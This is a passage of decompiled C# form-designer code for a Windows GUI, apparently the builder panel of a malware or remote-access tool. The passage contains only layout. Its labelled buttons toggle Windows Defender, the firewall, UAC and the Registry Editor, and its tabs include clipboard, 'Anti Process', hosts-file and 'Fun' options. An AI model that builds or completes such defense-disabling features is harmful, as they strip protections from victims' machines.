        this.ButClipboad.HoverState.Parent = this.ButClipboad;
        this.ButClipboad.ImageSize = new System.Drawing.Size(27, 27);
        this.ButClipboad.Location = new System.Drawing.Point(4, 182);
        this.ButClipboad.Name = "ButClipboad";
        this.ButClipboad.PressedColor = System.Drawing.Color.White;
        this.ButClipboad.ShadowDecoration.Parent = this.ButClipboad;
        this.ButClipboad.Size = new System.Drawing.Size(38, 38);
        this.ButClipboad.TabIndex = 22;
        this.ButClipboad.UseTransparentBackground = true;
        this.ButClipboad.Click += new System.EventHandler(ButClipboad_Click);
        this.guna2Button_0.Anchor = System.Windows.Forms.AnchorStyles.Left;
        this.guna2Button_0.BackColor = System.Drawing.Color.Transparent;
        this.guna2Button_0.BorderRadius = 10;
        this.guna2Button_0.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
        this.guna2Button_0.CheckedState.BorderColor = System.Drawing.Color.White;
        this.guna2Button_0.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.guna2Button_0.CheckedState.FillColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.guna2Button_0.CheckedState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.guna2Button_0.CheckedState.Parent = this.guna2Button_0;
        this.guna2Button_0.Cursor = System.Windows.Forms.Cursors.Hand;
        this.guna2Button_0.CustomBorderColor = System.Drawing.Color.White;
        this.guna2Button_0.CustomImages.CheckedImage = (System.Drawing.Image)resources.GetObject("ButDotNET.CustomImages.CheckedImage");
        this.guna2Button_0.CustomImages.HoveredImage = (System.Drawing.Image)resources.GetObject("ButDotNET.CustomImages.HoveredImage");
        this.guna2Button_0.CustomImages.Image = (System.Drawing.Image)resources.GetObject("ButDotNET.CustomImages.Image");
        this.guna2Button_0.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.guna2Button_0.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.guna2Button_0.CustomImages.Parent = this.guna2Button_0;
        this.guna2Button_0.FillColor = System.Drawing.Color.White;
        this.guna2Button_0.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.guna2Button_0.ForeColor = System.Drawing.Color.White;
        this.guna2Button_0.HoverState.BorderColor = System.Drawing.Color.White;
        this.guna2Button_0.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.guna2Button_0.HoverState.FillColor = System.Drawing.Color.White;
        this.guna2Button_0.HoverState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.guna2Button_0.HoverState.Parent = this.guna2Button_0;
        this.guna2Button_0.ImageSize = new System.Drawing.Size(27, 27);
        this.guna2Button_0.Location = new System.Drawing.Point(4, 138);
        this.guna2Button_0.Name = "ButDotNET";
        this.guna2Button_0.PressedColor = System.Drawing.Color.White;
        this.guna2Button_0.ShadowDecoration.Parent = this.guna2Button_0;
        this.guna2Button_0.Size = new System.Drawing.Size(38, 38);
        this.guna2Button_0.TabIndex = 21;
        this.guna2Button_0.UseTransparentBackground = true;
        this.guna2Button_0.Click += new System.EventHandler(ButDotNET_Click);
        this.ButAdmin.Anchor = System.Windows.Forms.AnchorStyles.Left;
        this.ButAdmin.BackColor = System.Drawing.Color.Transparent;
        this.ButAdmin.BorderRadius = 10;
        this.ButAdmin.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
        this.ButAdmin.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButAdmin.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButAdmin.CheckedState.FillColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButAdmin.CheckedState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButAdmin.CheckedState.Parent = this.ButAdmin;
        this.ButAdmin.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButAdmin.CustomBorderColor = System.Drawing.Color.White;
        this.ButAdmin.CustomImages.CheckedImage = (System.Drawing.Image)resources.GetObject("ButAdmin.CustomImages.CheckedImage");
        this.ButAdmin.CustomImages.HoveredImage = (System.Drawing.Image)resources.GetObject("ButAdmin.CustomImages.HoveredImage");
        this.ButAdmin.CustomImages.Image = (System.Drawing.Image)resources.GetObject("ButAdmin.CustomImages.Image");
        this.ButAdmin.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ButAdmin.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.ButAdmin.CustomImages.Parent = this.ButAdmin;
        this.ButAdmin.FillColor = System.Drawing.Color.White;
        this.ButAdmin.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButAdmin.ForeColor = System.Drawing.Color.White;
        this.ButAdmin.HoverState.BorderColor = System.Drawing.Color.White;
        this.ButAdmin.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.ButAdmin.HoverState.FillColor = System.Drawing.Color.White;
        this.ButAdmin.HoverState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButAdmin.HoverState.Parent = this.ButAdmin;
        this.ButAdmin.ImageSize = new System.Drawing.Size(27, 27);
        this.ButAdmin.Location = new System.Drawing.Point(4, 94);
        this.ButAdmin.Name = "ButAdmin";
        this.ButAdmin.PressedColor = System.Drawing.Color.White;
        this.ButAdmin.ShadowDecoration.Parent = this.ButAdmin;
        this.ButAdmin.Size = new System.Drawing.Size(38, 38);
        this.ButAdmin.TabIndex = 20;
        this.ButAdmin.UseTransparentBackground = true;
        this.ButAdmin.Click += new System.EventHandler(ButAdmin_Click);
        this.ButSettings.Anchor = System.Windows.Forms.AnchorStyles.Left;
        this.ButSettings.BackColor = System.Drawing.Color.Transparent;
        this.ButSettings.BorderRadius = 10;
        this.ButSettings.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
        this.ButSettings.Checked = true;
        this.ButSettings.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButSettings.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButSettings.CheckedState.FillColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButSettings.CheckedState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButSettings.CheckedState.Parent = this.ButSettings;
        this.ButSettings.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButSettings.CustomBorderColor = System.Drawing.Color.White;
        this.ButSettings.CustomImages.CheckedImage = (System.Drawing.Image)resources.GetObject("ButSettings.CustomImages.CheckedImage");
        this.ButSettings.CustomImages.HoveredImage = (System.Drawing.Image)resources.GetObject("ButSettings.CustomImages.HoveredImage");
        this.ButSettings.CustomImages.Image = (System.Drawing.Image)resources.GetObject("ButSettings.CustomImages.Image");
        this.ButSettings.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ButSettings.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.ButSettings.CustomImages.Parent = this.ButSettings;
        this.ButSettings.FillColor = System.Drawing.Color.White;
        this.ButSettings.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButSettings.ForeColor = System.Drawing.Color.White;
        this.ButSettings.HoverState.BorderColor = System.Drawing.Color.White;
        this.ButSettings.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.ButSettings.HoverState.FillColor = System.Drawing.Color.White;
        this.ButSettings.HoverState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButSettings.HoverState.Parent = this.ButSettings;
        this.ButSettings.ImageSize = new System.Drawing.Size(27, 27);
        this.ButSettings.Location = new System.Drawing.Point(4, 50);
        this.ButSettings.Name = "ButSettings";
        this.ButSettings.PressedColor = System.Drawing.Color.White;
        this.ButSettings.ShadowDecoration.Parent = this.ButSettings;
        this.ButSettings.Size = new System.Drawing.Size(38, 38);
        this.ButSettings.TabIndex = 19;
        this.ButSettings.UseTransparentBackground = true;
        this.ButSettings.Click += new System.EventHandler(ButSettings_Click);
        this.PageOption.Alignment = System.Windows.Forms.TabAlignment.Bottom;
        this.PageOption.AllowTransitions = false;
        this.PageOption.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PageOption.Controls.Add(this.PageSettings);
        this.PageOption.Controls.Add(this.PageAdmin);
        this.PageOption.Controls.Add(this.tabPage_0);
        this.PageOption.Controls.Add(this.PageClipboard);
        this.PageOption.Controls.Add(this.PageMessageBox);
        this.PageOption.Controls.Add(this.PageAnti);
        this.PageOption.Controls.Add(this.PageFun);
        this.PageOption.Controls.Add(this.PageHosts);
        this.PageOption.Location = new System.Drawing.Point(67, 112);
        this.PageOption.Multiline = true;
        this.PageOption.Name = "PageOption";
        this.PageOption.Page = this.PageFun;
        this.PageOption.PageIndex = 6;
        this.PageOption.PageName = "PageFun";
        this.PageOption.PageTitle = "PageFun";
        this.PageOption.SelectedIndex = 0;
        this.PageOption.Size = new System.Drawing.Size(749, 442);
        this.PageOption.TabIndex = 601;
        animation.AnimateOnlyDifferences = false;
        animation.BlindCoeff = (System.Drawing.PointF)resources.GetObject("animation1.BlindCoeff");
        animation.LeafCoeff = 0f;
        animation.MaxTime = 1f;
        animation.MinTime = 0f;
        animation.MosaicCoeff = (System.Drawing.PointF)resources.GetObject("animation1.MosaicCoeff");
        animation.MosaicShift = (System.Drawing.PointF)resources.GetObject("animation1.MosaicShift");
        animation.MosaicSize = 0;
        animation.Padding = new System.Windows.Forms.Padding(0);
        animation.RotateCoeff = 0f;
        animation.RotateLimit = 0f;
        animation.ScaleCoeff = (System.Drawing.PointF)resources.GetObject("animation1.ScaleCoeff");
        animation.SlideCoeff = (System.Drawing.PointF)resources.GetObject("animation1.SlideCoeff");
        animation.TimeCoeff = 0f;
        animation.TransparencyCoeff = 0f;
        this.PageOption.Transition = animation;
        this.PageOption.TransitionType = Utilities.BunifuPages.BunifuAnimatorNS.AnimationType.Custom;
        this.PageSettings.Controls.Add(this.pictureBox2);
        this.PageSettings.Controls.Add(this.guna2GradientButton_0);
        this.PageSettings.Controls.Add(this.guna2GradientButton_1);
        this.PageSettings.Controls.Add(this.guna2HtmlLabel6);
        this.PageSettings.Controls.Add(this.EnabledRegistry);
        this.PageSettings.Controls.Add(this.DisabledRegistry);
        this.PageSettings.Controls.Add(this.guna2HtmlLabel5);
        this.PageSettings.Controls.Add(this.EnabledAnti);
        this.PageSettings.Controls.Add(this.DisabledAnti);
        this.PageSettings.Controls.Add(this.guna2HtmlLabel2);
        this.PageSettings.Controls.Add(this.EnabledFirewall);
        this.PageSettings.Controls.Add(this.DisabledWD);
        this.PageSettings.Controls.Add(this.guna2HtmlLabel1);
        this.PageSettings.Controls.Add(this.DisabledFirewall);
        this.PageSettings.Controls.Add(this.guna2HtmlLabel3);
        this.PageSettings.Location = new System.Drawing.Point(4, 4);
        this.PageSettings.Name = "PageSettings";
        this.PageSettings.Size = new System.Drawing.Size(741, 416);
        this.PageSettings.TabIndex = 0;
        this.PageSettings.Text = "PageSettings";
        this.PageSettings.UseVisualStyleBackColor = true;
        this.pictureBox2.Anchor = System.Windows.Forms.AnchorStyles.Right;
        this.pictureBox2.Image = (System.Drawing.Image)resources.GetObject("pictureBox2.Image");
        this.pictureBox2.Location = new System.Drawing.Point(238, 44);
        this.pictureBox2.Name = "pictureBox2";
        this.pictureBox2.Size = new System.Drawing.Size(496, 346);
        this.pictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
        this.pictureBox2.TabIndex = 720;
        this.pictureBox2.TabStop = false;
        this.guna2GradientButton_0.BackColor = System.Drawing.Color.White;
        this.guna2GradientButton_0.BorderRadius = 4;
        this.guna2GradientButton_0.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.guna2GradientButton_0.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.guna2GradientButton_0.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.guna2GradientButton_0.CheckedState.Parent = this.guna2GradientButton_0;
        this.guna2GradientButton_0.Cursor = System.Windows.Forms.Cursors.Hand;
        this.guna2GradientButton_0.CustomImages.Parent = this.guna2GradientButton_0;
        this.guna2GradientButton_0.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.guna2GradientButton_0.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.guna2GradientButton_0.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.guna2GradientButton_0.ForeColor = System.Drawing.Color.White;
        this.guna2GradientButton_0.HoverState.Parent = this.guna2GradientButton_0;
        this.guna2GradientButton_0.Location = new System.Drawing.Point(122, 273);
        this.guna2GradientButton_0.Name = "EnabledUAC";
        this.guna2GradientButton_0.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.guna2GradientButton_0.PressedDepth = 50;
        this.guna2GradientButton_0.ShadowDecoration.Parent = this.guna2GradientButton_0;
        this.guna2GradientButton_0.Size = new System.Drawing.Size(96, 26);
        this.guna2GradientButton_0.TabIndex = 719;
        this.guna2GradientButton_0.Text = "Enabled";
        this.guna2GradientButton_0.Click += new System.EventHandler(EnabledUAC_Click);
        this.guna2GradientButton_1.BackColor = System.Drawing.Color.White;
        this.guna2GradientButton_1.BorderRadius = 4;
        this.guna2GradientButton_1.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.guna2GradientButton_1.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.guna2GradientButton_1.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.guna2GradientButton_1.CheckedState.Parent = this.guna2GradientButton_1;
        this.guna2GradientButton_1.Cursor = System.Windows.Forms.Cursors.Hand;
        this.guna2GradientButton_1.CustomImages.Parent = this.guna2GradientButton_1;
        this.guna2GradientButton_1.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.guna2GradientButton_1.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.guna2GradientButton_1.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.guna2GradientButton_1.ForeColor = System.Drawing.Color.White;
        this.guna2GradientButton_1.HoverState.Parent = this.guna2GradientButton_1;
        this.guna2GradientButton_1.Location = new System.Drawing.Point(20, 273);
        this.guna2GradientButton_1.Name = "DisabledUAC";
        this.guna2GradientButton_1.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.guna2GradientButton_1.PressedDepth = 50;
        this.guna2GradientButton_1.ShadowDecoration.Parent = this.guna2GradientButton_1;
        this.guna2GradientButton_1.Size = new System.Drawing.Size(96, 26);
        this.guna2GradientButton_1.TabIndex = 718;
        this.guna2GradientButton_1.Text = "Disabled";
        this.guna2GradientButton_1.Click += new System.EventHandler(DisabledUAC_Click);
        this.guna2HtmlLabel6.BackColor = System.Drawing.Color.White;
        this.guna2HtmlLabel6.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.guna2HtmlLabel6.ForeColor = System.Drawing.Color.Black;
        this.guna2HtmlLabel6.Location = new System.Drawing.Point(20, 241);
        this.guna2HtmlLabel6.Name = "guna2HtmlLabel6";
        this.guna2HtmlLabel6.Size = new System.Drawing.Size(33, 17);
        this.guna2HtmlLabel6.TabIndex = 717;
        this.guna2HtmlLabel6.Text = "UAC :";
        this.EnabledRegistry.BackColor = System.Drawing.Color.White;
        this.EnabledRegistry.BorderRadius = 4;
        this.EnabledRegistry.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.EnabledRegistry.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.EnabledRegistry.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.EnabledRegistry.CheckedState.Parent = this.EnabledRegistry;
        this.EnabledRegistry.Cursor = System.Windows.Forms.Cursors.Hand;
        this.EnabledRegistry.CustomImages.Parent = this.EnabledRegistry;
        this.EnabledRegistry.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.EnabledRegistry.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.EnabledRegistry.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.EnabledRegistry.ForeColor = System.Drawing.Color.White;
        this.EnabledRegistry.HoverState.Parent = this.EnabledRegistry;
        this.EnabledRegistry.Location = new System.Drawing.Point(122, 354);
        this.EnabledRegistry.Name = "EnabledRegistry";
        this.EnabledRegistry.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.EnabledRegistry.PressedDepth = 50;
        this.EnabledRegistry.ShadowDecoration.Parent = this.EnabledRegistry;
        this.EnabledRegistry.Size = new System.Drawing.Size(96, 26);
        this.EnabledRegistry.TabIndex = 716;
        this.EnabledRegistry.Text = "Enabled";
        this.EnabledRegistry.Click += new System.EventHandler(EnabledRegistry_Click);
        this.DisabledRegistry.BackColor = System.Drawing.Color.White;
        this.DisabledRegistry.BorderRadius = 4;
        this.DisabledRegistry.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.DisabledRegistry.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.DisabledRegistry.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.DisabledRegistry.CheckedState.Parent = this.DisabledRegistry;
        this.DisabledRegistry.Cursor = System.Windows.Forms.Cursors.Hand;
        this.DisabledRegistry.CustomImages.Parent = this.DisabledRegistry;
        this.DisabledRegistry.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.DisabledRegistry.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.DisabledRegistry.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.DisabledRegistry.ForeColor = System.Drawing.Color.White;
        this.DisabledRegistry.HoverState.Parent = this.DisabledRegistry;
        this.DisabledRegistry.Location = new System.Drawing.Point(20, 354);
        this.DisabledRegistry.Name = "DisabledRegistry";
        this.DisabledRegistry.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.DisabledRegistry.PressedDepth = 50;
        this.DisabledRegistry.ShadowDecoration.Parent = this.DisabledRegistry;
        this.DisabledRegistry.Size = new System.Drawing.Size(96, 26);
        this.DisabledRegistry.TabIndex = 715;
        this.DisabledRegistry.Text = "Disabled";
        this.DisabledRegistry.Click += new System.EventHandler(DisabledRegistry_Click);
        this.guna2HtmlLabel5.BackColor = System.Drawing.Color.White;
        this.guna2HtmlLabel5.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.guna2HtmlLabel5.ForeColor = System.Drawing.Color.Black;
        this.guna2HtmlLabel5.Location = new System.Drawing.Point(20, 322);
        this.guna2HtmlLabel5.Name = "guna2HtmlLabel5";
        this.guna2HtmlLabel5.Size = new System.Drawing.Size(85, 17);
        this.guna2HtmlLabel5.TabIndex = 714;
        this.guna2HtmlLabel5.Text = "Registry Editor  :";
        this.EnabledAnti.BackColor = System.Drawing.Color.White;
        this.EnabledAnti.BorderRadius = 4;
        this.EnabledAnti.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.EnabledAnti.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.EnabledAnti.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.EnabledAnti.CheckedState.Parent = this.EnabledAnti;
        this.EnabledAnti.Cursor = System.Windows.Forms.Cursors.Hand;
        this.EnabledAnti.CustomImages.Parent = this.EnabledAnti;
        this.EnabledAnti.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.EnabledAnti.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.EnabledAnti.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.EnabledAnti.ForeColor = System.Drawing.Color.White;
        this.EnabledAnti.HoverState.Parent = this.EnabledAnti;
        this.EnabledAnti.Location = new System.Drawing.Point(122, 205);
        this.EnabledAnti.Name = "EnabledAnti";
        this.EnabledAnti.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.EnabledAnti.PressedDepth = 50;
        this.EnabledAnti.ShadowDecoration.Parent = this.EnabledAnti;
        this.EnabledAnti.Size = new System.Drawing.Size(96, 26);
        this.EnabledAnti.TabIndex = 710;
        this.EnabledAnti.Text = "Start";
        this.EnabledAnti.Click += new System.EventHandler(EnabledAnti_Click);
        this.DisabledAnti.BackColor = System.Drawing.Color.White;
        this.DisabledAnti.BorderRadius = 4;
        this.DisabledAnti.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.DisabledAnti.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.DisabledAnti.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.DisabledAnti.CheckedState.Parent = this.DisabledAnti;
        this.DisabledAnti.Cursor = System.Windows.Forms.Cursors.Hand;
        this.DisabledAnti.CustomImages.Parent = this.DisabledAnti;
        this.DisabledAnti.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.DisabledAnti.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.DisabledAnti.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.DisabledAnti.ForeColor = System.Drawing.Color.White;
        this.DisabledAnti.HoverState.Parent = this.DisabledAnti;
        this.DisabledAnti.Location = new System.Drawing.Point(20, 205);
        this.DisabledAnti.Name = "DisabledAnti";
        this.DisabledAnti.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.DisabledAnti.PressedDepth = 50;
        this.DisabledAnti.ShadowDecoration.Parent = this.DisabledAnti;
        this.DisabledAnti.Size = new System.Drawing.Size(96, 26);
        this.DisabledAnti.TabIndex = 709;
        this.DisabledAnti.Text = "Stop";
        this.DisabledAnti.Click += new System.EventHandler(DisabledAnti_Click);
        this.guna2HtmlLabel2.BackColor = System.Drawing.Color.White;
        this.guna2HtmlLabel2.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.guna2HtmlLabel2.ForeColor = System.Drawing.Color.Black;
        this.guna2HtmlLabel2.Location = new System.Drawing.Point(20, 173);
        this.guna2HtmlLabel2.Name = "guna2HtmlLabel2";
        this.guna2HtmlLabel2.Size = new System.Drawing.Size(74, 17);
        this.guna2HtmlLabel2.TabIndex = 708;
        this.guna2HtmlLabel2.Text = "Anti Process :";
        this.EnabledFirewall.BackColor = System.Drawing.Color.White;
        this.EnabledFirewall.BorderRadius = 4;
        this.EnabledFirewall.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.EnabledFirewall.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.EnabledFirewall.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.EnabledFirewall.CheckedState.Parent = this.EnabledFirewall;
        this.EnabledFirewall.Cursor = System.Windows.Forms.Cursors.Hand;
        this.EnabledFirewall.CustomImages.Parent = this.EnabledFirewall;
        this.EnabledFirewall.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.EnabledFirewall.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.EnabledFirewall.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.EnabledFirewall.ForeColor = System.Drawing.Color.White;
        this.EnabledFirewall.HoverState.Parent = this.EnabledFirewall;
        this.EnabledFirewall.Location = new System.Drawing.Point(122, 135);
        this.EnabledFirewall.Name = "EnabledFirewall";
        this.EnabledFirewall.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.EnabledFirewall.PressedDepth = 50;
        this.EnabledFirewall.ShadowDecoration.Parent = this.EnabledFirewall;
        this.EnabledFirewall.Size = new System.Drawing.Size(96, 26);
        this.EnabledFirewall.TabIndex = 707;
        this.EnabledFirewall.Text = "Enabled";
        this.EnabledFirewall.Click += new System.EventHandler(EnabledFirewall_Click);
        this.DisabledWD.BackColor = System.Drawing.Color.White;
        this.DisabledWD.BorderRadius = 4;
        this.DisabledWD.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.DisabledWD.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.DisabledWD.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.DisabledWD.CheckedState.Parent = this.DisabledWD;
        this.DisabledWD.Cursor = System.Windows.Forms.Cursors.Hand;
        this.DisabledWD.CustomImages.Parent = this.DisabledWD;
        this.DisabledWD.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.DisabledWD.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.DisabledWD.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.DisabledWD.ForeColor = System.Drawing.Color.White;
        this.DisabledWD.HoverState.Parent = this.DisabledWD;
        this.DisabledWD.Location = new System.Drawing.Point(20, 61);
        this.DisabledWD.Name = "DisabledWD";
        this.DisabledWD.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.DisabledWD.PressedDepth = 50;
        this.DisabledWD.ShadowDecoration.Parent = this.DisabledWD;
        this.DisabledWD.Size = new System.Drawing.Size(96, 26);
        this.DisabledWD.TabIndex = 706;
        this.DisabledWD.Text = "Disabled";
        this.DisabledWD.Click += new System.EventHandler(DisabledWD_Click);
        this.guna2HtmlLabel1.BackColor = System.Drawing.Color.White;
        this.guna2HtmlLabel1.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.guna2HtmlLabel1.ForeColor = System.Drawing.Color.Black;
        this.guna2HtmlLabel1.Location = new System.Drawing.Point(20, 29);
        this.guna2HtmlLabel1.Name = "guna2HtmlLabel1";
        this.guna2HtmlLabel1.Size = new System.Drawing.Size(109, 17);
        this.guna2HtmlLabel1.TabIndex = 705;
        this.guna2HtmlLabel1.Text = "Windows Defender :";
        this.DisabledFirewall.BackColor = System.Drawing.Color.White;
        this.DisabledFirewall.BorderRadius = 4;
        this.DisabledFirewall.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.DisabledFirewall.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.DisabledFirewall.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.DisabledFirewall.CheckedState.Parent = this.DisabledFirewall;
        this.DisabledFirewall.Cursor = System.Windows.Forms.Cursors.Hand;
        this.DisabledFirewall.CustomImages.Parent = this.DisabledFirewall;
        this.DisabledFirewall.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.DisabledFirewall.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.DisabledFirewall.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.DisabledFirewall.ForeColor = System.Drawing.Color.White;
        this.DisabledFirewall.HoverState.Parent = this.DisabledFirewall;
        this.DisabledFirewall.Location = new System.Drawing.Point(20, 135);
        this.DisabledFirewall.Name = "DisabledFirewall";
        this.DisabledFirewall.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.DisabledFirewall.PressedDepth = 50;
        this.DisabledFirewall.ShadowDecoration.Parent = this.DisabledFirewall;
        this.DisabledFirewall.Size = new System.Drawing.Size(96, 26);
        this.DisabledFirewall.TabIndex = 704;
        this.DisabledFirewall.Text = "Disabled";
        this.DisabledFirewall.Click += new System.EventHandler(DisabledFirewall_Click);
        this.guna2HtmlLabel3.BackColor = System.Drawing.Color.White;
        this.guna2HtmlLabel3.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.guna2HtmlLabel3.ForeColor = System.Drawing.Color.Black;
        this.guna2HtmlLabel3.Location = new System.Drawing.Point(20, 103);
        this.guna2HtmlLabel3.Name = "guna2HtmlLabel3";
        this.guna2HtmlLabel3.Size = new System.Drawing.Size(152, 17);
        this.guna2HtmlLabel3.TabIndex = 703;
        this.guna2HtmlLabel3.Text = "Windows Defender Firewall :";
        this.PageAdmin.Controls.Add(this.StateAdmin);
        this.PageAdmin.Controls.Add(this.guna2GradientButton_2);
        this.PageAdmin.Controls.Add(this.guna2GradientButton_3);
        this.PageAdmin.Controls.Add(this.AddUAC);
        this.PageAdmin.Controls.Add(this.RunAsadminstartor);
        this.PageAdmin.Controls.Add(this.bunifuLabel3);
        this.PageAdmin.Controls.Add(this.InfoAdmin);
        this.PageAdmin.Location = new System.Drawing.Point(4, 4);
        this.PageAdmin.Name = "PageAdmin";
        this.PageAdmin.Size = new System.Drawing.Size(741, 416);
        this.PageAdmin.TabIndex = 1;
        this.PageAdmin.Text = "PageAdmin";
        this.PageAdmin.UseVisualStyleBackColor = true;
        this.StateAdmin.AllowParentOverrides = false;
        this.StateAdmin.Anchor = System.Windows.Forms.AnchorStyles.None;
        this.StateAdmin.AutoEllipsis = false;
        this.StateAdmin.Cursor = System.Windows.Forms.Cursors.Default;
        this.StateAdmin.CursorType = System.Windows.Forms.Cursors.Default;
        this.StateAdmin.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.StateAdmin.ForeColor = System.Drawing.Color.Black;
        this.StateAdmin.Location = new System.Drawing.Point(211, 101);
        this.StateAdmin.Name = "StateAdmin";
        this.StateAdmin.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.StateAdmin.Size = new System.Drawing.Size(10, 15);
        this.StateAdmin.TabIndex = 711;
        this.StateAdmin.Text = "--";
        this.StateAdmin.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.StateAdmin.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
